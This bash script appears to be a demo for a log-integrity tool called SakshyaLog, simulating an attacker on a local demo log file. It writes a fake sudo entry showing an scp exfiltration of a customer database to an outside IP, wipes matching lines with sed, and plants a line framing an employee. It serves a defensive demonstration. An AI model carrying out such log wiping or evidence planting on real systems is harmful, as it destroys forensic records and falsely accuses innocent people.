#!/usr/bin/env bash
# SakshyaLog live demo: the "hacker" script.
# Simulates an attacker who gained root, stole data, and now wipes the evidence.
# Usage: bash demo/attack.sh [path-to-log]
LOG="${1:-demo/logs/auth.log}"
TS=$(date "+%b %d %H:%M:%S")

echo "😈 [attacker] Logging in as root from 45.33.32.156 ..."
echo "$TS server-01 sshd[66601]: Accepted password for root from 45.33.32.156 port 51515 ssh2" >> "$LOG"
sleep 2
echo "😈 [attacker] Stealing customer database ..."
echo "$TS server-01 sudo: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/scp /var/db/customers.sql 45.33.32.156:/tmp/" >> "$LOG"
sleep 4   # by now the agent has already shipped both lines to the vault

echo "😈 [attacker] Erasing my tracks from $LOG ..."
sed -i '/45\.33\.32\.156/d' "$LOG"
sleep 1
echo "😈 [attacker] Planting a fake line to blame an employee ..."
echo "$TS server-01 sudo: rahul : TTY=pts/1 ; PWD=/home/rahul ; USER=root ; COMMAND=/usr/bin/cp /var/db/customers.sql /mnt/usb/" >> "$LOG"

echo
echo "✅ [attacker] grep for my IP on the server finds:"
grep -c "45.33.32.156" "$LOG" || true
echo "   ...nothing. Clean, right? Now open the SakshyaLog dashboard. 👀"
